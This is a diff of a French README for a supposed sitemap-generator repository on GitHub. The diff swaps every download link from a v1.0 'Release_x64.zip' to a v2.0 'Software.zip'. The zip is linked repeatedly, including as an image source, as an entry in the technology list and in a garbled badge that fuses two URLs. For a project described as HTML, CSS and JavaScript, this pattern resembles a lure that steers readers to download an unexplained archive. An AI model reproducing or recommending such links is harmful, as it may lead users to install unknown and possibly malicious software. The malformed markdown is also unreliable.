@@ -3,7 +3,7 @@
 
 ## Créez des plans de site structurés pour organiser vos contenus et améliorer l’expérience utilisateur et le référencement.
 
-![Arborescence](https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v1.0/Release_x64.zip)
+![Arborescence](https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v2.0/Software.zip)
 
 Bienvenue dans le référentiel **Generateur-d-Arborescence**! Ce référentiel a été créé pour vous aider à créer des plans de site structurés, ce qui est essentiel pour organiser efficacement vos contenus en ligne. Une bonne organisation des contenus peut améliorer l'expérience utilisateur et le référencement (SEO) de votre site web.
 
@@ -17,11 +17,11 @@ Bienvenue dans le référentiel **Generateur-d-Arborescence**! Ce référentiel 
 - HTML
 - CSS
 - JavaScript
-- https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v1.0/Release_x64.zip
+- https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v2.0/Software.zip
 
 ### 🔗 Liens importants
-- [Télécharger le logiciel](https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v1.0/Release_x64.zip)
-- ![Télécharger](https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v1.0/Release_x64.zipélécharger&https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v1.0/Release_x64.zip)
+- [Télécharger le logiciel](https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v2.0/Software.zip)
+- ![Télécharger](https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v2.0/Software.zipélécharger&https://github.com/Ttlime120/Generateur-d-Arborescence/releases/download/v2.0/Software.zip)
 
 ### 🗂️ Topics
 css, france, freelance, freelancer, html, javascript, node, paris, sea, seo, seo-friendly, seo-optimization, seotools
